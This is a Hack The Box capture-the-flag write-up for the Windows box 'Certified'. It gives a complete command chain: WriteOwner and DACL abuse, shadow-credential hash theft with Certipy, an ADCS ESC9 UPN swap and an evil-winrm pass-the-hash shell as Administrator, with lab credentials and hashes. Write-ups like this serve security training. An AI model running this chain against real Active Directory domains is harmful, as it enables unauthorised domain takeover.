## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB) 
- **Exploits Used**:
  - 🔓 **Assume Breach**: `WriteOwner` → DACL abuse → Shadow Credential  
  - 🔑 **ADCS ESC9**: UPN swap + no‑security‑ext template  
  - 🔄 **Shadow Credential** (Certipy) for NTLM extraction

**Open Ports:**
- 88/tcp [Kerberos]  
- 389/tcp [LDAP]  
- 445/tcp [SMB]  
- 5985/tcp [WinRM]  

---

## 🧠 TLDR  
1. **judith.mader** logs in, runs Bloodhound‑CE → finds ACL path to **management_svc** → **ca_operator**.  
2. Use **owneredit.py** + **dacledit.py** + `net rpc` to add judith ➡️ **Management_SVC**.  
3. As **management_svc**, inject **Shadow Credential** on itself → steal NTLM.  
4. As **ca_operator**, repeat **Shadow Credential** → steal its NTLM.  
5. Exploit **ADCS ESC9** via **ca_operator**: swap UPN→Administrator, request cert, extract admin hash.  
6. **Evil-WinRM** pass‑the‑hash → shell as **Administrator**. 🎉  

---

## 🧰 Tools  
- 🕵️ Recon & SMB: `nmap`, `netexec`  
- 📊 ACL Mapping: Bloodhound‑CE (`bloodhound-python`)  
- 🛠️ ACL Abuse: Impacket’s `owneredit.py`, `dacledit.py` + `net rpc`  
- 🧩 Shadow Credentials: `certipy shadow`  
- 🎛️ ADCS ESC9: `certipy account update`, `certipy req`, `certipy auth`  
- 💻 Shell: `evil-winrm`  

---

## 🚀 Commands to Solve Box
```bash
# 1) Recon & login
nmap -p- --min-rate 10000 10.10.11.41
nmap -p88,389,445,5985 -sCV 10.10.11.41
netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares

# 2) Bloodhound-CE collection
bloodhound-python -c all -u judith.mader -p judith09 \
  -d certified.htb -ns 10.10.11.41 --zip
# Upload ZIP to Bloodhound-CE UI → find ACL path

# 3) WriteOwner & DACL abuse
owneredit.py -action write \
  -new-owner judith.mader -target Management \
  certified/\
judith.mader:judith09 -dc-ip 10.10.11.41

dacledit.py -action write \
  -rights WriteMembers -principal judith.mader \
  -target Management certified/\
judith.mader:judith09 -dc-ip 10.10.11.41

net rpc group addmem Management judith.mader \
  -U "certified.htb/judith.mader%judith09" -S 10.10.11.41

# 4) Shadow Cred on management_svc
certipy shadow auto \
  -username judith.mader@certified.htb \
  -password judith09 \
  -account management_svc \
  -target certified.htb \
  -dc-ip 10.10.11.41
# → NTLM: a091c1832bcdd4677c28b5a6a1295584

# 5) Shell as management_svc
evil-winrm -i 10.10.11.41 \
  -u management_svc \
  -H a091c1832bcdd4677c28b5a6a1295584

# 6) Shadow Cred on ca_operator
certipy shadow auto \
  -username management_svc@certified.htb \
  -hashes :a091c1832bcdd4677c28b5a6a1295584 \
  -account ca_operator \
  -target certified.htb \
  -dc-ip 10.10.11.41
# → NTLM: b4b86f45c6018f1b664f70805f45d8f2

# 7) ESC9 ADCS exploit (ca_operator→Administrator)
certipy account update \
  -u management_svc \
  -hashes :a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator \
  -upn Administrator \
  -dc-ip 10.10.11.41

certipy req \
  -u ca_operator \
  -hashes :b4b86f45c6018f1b664f70805f45d8f2 \
  -ca certified-DC01-CA \
  -template CertifiedAuthentication \
  -dc-ip 10.10.11.41

certipy auth \
  -pfx administrator.pfx \
  -dc-ip 10.10.11.41
# → admin hash: 0d5b49608bbce1751f708748f67e2d34

# 8) Shell as Administrator
evil-winrm -i 10.10.11.41 \
  -u administrator \
  -H 0d5b49608bbce1751f708748f67e2d34
```

---

## 🎓 Actions Learned
- 📝 **WriteOwner Abuse** to seize group ownership  
- 🚧 **DACL Editing** (`WriteMembers`) to escalate membership  
- 🛡️ **Shadow Credential** injection for stealth NTLM harvest  
- 🔐 **ADCS ESC9 UPN Swap** for certificate‑based PTH to Administrator  

---

## 📚 References
- [Bloodhound‑CE (Docker)](https://github.com/BloodHoundAD/BloodHound#community-edition)  
- [Bloodhound.py Collector](https://github.com/dirkjanm/BloodHound.py)  
- [Impacket Examples](https://github.com/SecureAuthCorp/impacket#examples)  
- [Certipy (Shadow Credential)](https://github.com/ly4k/Certipy)  
- [ESC9 Attack Writeup](https://github.com/ly4k/Certipy#esc9)  
- [HTB Certified Walkthrough](https://0xdf.gitlab.io/2025/03/15/htb-certified.html)  